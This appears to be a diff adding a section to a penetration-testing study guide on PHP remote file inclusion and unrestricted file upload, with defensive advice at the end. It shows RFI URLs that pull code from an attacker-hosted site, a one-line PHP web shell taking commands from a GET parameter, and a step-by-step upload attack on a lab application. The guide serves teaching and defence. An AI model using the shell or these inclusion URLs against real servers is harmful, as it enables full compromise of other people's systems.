@@ -554,3 +554,137 @@ Our aim in this case is not just to read but, to include our own code in the exe
 
 A common exploit to this vulnerability is to include a PHP shell that would let the hacker or the pentester execute any code on the server.
 Even the simplest PHP shell will accept commands from GET/POST arguments and execute them on the server.
+
+It is important to know that the file included must not have the `.php` extension, otherwise the code within the included file will run on the attacker machine, instead of the target web application. Let's look at an example.
+  The vulnerable application is hosted on a Linux machine (http://rfi.site), while the attacker web application that contains the two files to include is hosted on Windows (http://atk.site)
+
+  To verify what happens, we are going to use to the following code for both files `test.php` and `test.txt` (both hosted on the attacker machine). This simple PHP script calls the `phpinfo()` function, which returns information on the current status of PHP running on the machine.
+    ```
+    <?php
+      phpinfo();
+    ?>
+    ```
+
+  If we try to exploit the RFI and include the file `test.txt` (by typing http://rfi.site/index.php?location=http://atk.site/test.txt), we can see that the information returned by the `phpinfo()` function are related to the vulnerable web application. So the RFI works just fine. (see img-113)
+
+  Meanwhile, if we try to include the `test.php` file (by typing http://rfi.site/index.php?location=http://atk.site/test.php), we can see that the `phpinfo()` function returns the information of our (attacker) web server. That is why we have to use a `.txt` file. (see img-114)
+
+This vulnerability should be checked when an `include` is thought to be present in the code.
+To immediately spot a vulnerable parameter, you can try to inject "http://www.google.com"
+  ```
+  vuln.php?page=http://www.google.com
+  ```
+  If it is vulnerable, the HTML code of **google.com** should be injected in the vulnerable web page.
+
+**Note:** RFI is possible because the `allow_url_include` directive set to `On` within `php.ini`. It is a good practice to set it to `Off`.
+Exploiting RFI requires that you have a PHP shell uploaded somewhere and accessible on the internet.
+*Note that there are plenty of shells you can find online, each one with its features and specific functions*
+
+#### 5.4.3. Unrestricted File Upload
+The [unrestricted file upload](https://www.owasp.org/index.php/Unrestricted_File_Upload) vulnerability is one of the most dangerous vulnerabilities a web application can suffer from.
+
+This vulnerability affects all the web applications that allow file upload, without properly enforcing restrictive policies on:
+- The maximum size of the file (DoS)
+- The nature of the file (Image, PDF, XLS)
+
+If web applications do not implement proper inspection on files uploaded by the user, the risks of being compromised is very high.
+Although the impact of this vulnerability highly depends upon how file is used by the web application, a malicious user (as well as a penetration tester) may be able to acquire complete control of the system.
+
+###### 5.4.3.1. Vulnerable Web Application
+Let's see how this vulnerability works and how it can be exploited.
+
+Our target web application is hosted on the following domain: http://fileupload.site, and an authenticated user can upload a personal image on his/her profile.
+
+Suppose that the upload occurs through a POST method at the following web page:
+  ```
+  http://fileupload.site/uploadImage.php
+  ```
+and the new image will be available by requesting the following URL:
+  ```
+  http://fileupload.site/images/<FileNameAsUploadedByTheUSER>
+  ```
+
+If the web application does not perform checks on the filetype uploaded, a malicious user could upload a shell and execute it by browsing to the uploaded file (if the path and file name is predictable or known).
+  ```
+  <?php
+    exec($_GET['command']);
+  ?>
+  ```
+
+With the simple shell we just saw in the previous slide, the attacker would be able to launch arbitrary OS commands by specifying them in the URL:
+  ```
+  http://fileupload.site/images/myshell.php?command=<COMMAND>
+  ```
+
+In order for the application to be vulnerable, the following conditions must apply:
+- The filetype is not checked against a whitelist of allowed formats
+- The filename and path of the uploaded file is known to the attacker or is guessable
+- The folder in which the file is placed allows the execution of server-side scripts
+
+Note that uploading a shell is the most impactful exploitation approach to this vulnerability, but certainly not the only one.
+Although a web shell may allow the attacker to execute commands, browse the system and so on, other attacks can be run such as: creating phishing pages, defacing of the web application, storing XSS, uploading malicious files...
+
+**The attack**
+  Let's see a very simple example of a vulnerable web application that allow users to upload a file to use as an image on their profile.
+
+  The first thing to do is to understand how the application works:
+  - Where the file is stored
+  - How it is used
+  - How it is included in the web application itself
+
+  The following is the target web application. Let us try to upload an image and see what happens. (see img-126)
+
+  Let's click on the browse button and select an image file on our system: `atk.png`.
+    Once we upload it we are redirected back to the `account.php` page and this is what happens (see img-127)
+
+    The image is successfully uploaded and if we inspect the source code of the page, we can see that it is stored on the web server in the **uploads** folder. Moreover, it is renamed with our user ID (`231` in our case).
+      ```
+      <div class="content">
+        <header>
+        <span class="image">
+          <img alt="" src="uploads/231.png">
+        </span>
+        <span> </span>
+      </div>
+      ```
+
+  The next step is to verify what happens if we try to upload a file with a different extension.
+    We will try to upload a file named `info.php` which contains the `phpinfo()` function.
+
+    No error or exception is raised. Moreover, if we inspect the source code of the `account.php` page we can see that it tries to use the file `231.php` in the `img` tag.
+      ```
+      <span class="image">
+        <img alt="" src="uploads/231.php">
+      </span>
+      ```
+
+  It seems that the vulnerability is there. We can now try to navigate the URL `fileupload.site/uploads/231.php`. As we can see, the vulnerability exists and we are able to get the server information thanks to the file that was just uploaded.
+
+  So the application fails to check both the extension of the file and its content.
+  Due to this weak configuration, an attacker can upload any shell or type of file, compromise the system and obtain complete control of the web server.
+
+###### 5.4.3.2. Best Defensive Techniques
+A web developer should inspect the uploaded file at two different layers:
+- Metadata (name, extension, size, etc.)
+- Actual content
+
+Enforcing a whitelist (or blacklist) of allowed file extensions is the first line of defense. But, unfortunately, not the ultimate solution. This will just make it more difficult for attackers but, it will not stop them
+  Example:
+    A web application allows the upload of PDF files with `.pdf` extension only
+
+  The files are shown to the user through an include of the content.
+  If malicious user puts server-side code within a text file, renamed it with `.pdf` extension, the code will be executed.
+  The file extension is not a protection mechanism!
+
+  Furthermore, file uploads with restricted extensions are still prone to be exploited when a local file inclusion exploit is found elsewhere in the web application.
+
+**Filtering Based on File Content**  
+The best defense it to actually determine the file type by inspecting the content of the uploaded file. This can be achieved using libraries for binary formats or parsers for text files.
+However, this is not the only recommendation. Web developers must limit the file size as well as the file name, set proper permission on the upload folder, filter and discard special character, use virus scanners, and so on.
+
+Web developers must answer the following questions before creating a filter:
+- Who will use the uploaded file?
+- How will the uploaded file be used?
+  - Will the content of the file be interpreted by an HTML parser?
+  - ...
+- What privileges will this file have/need on my server?
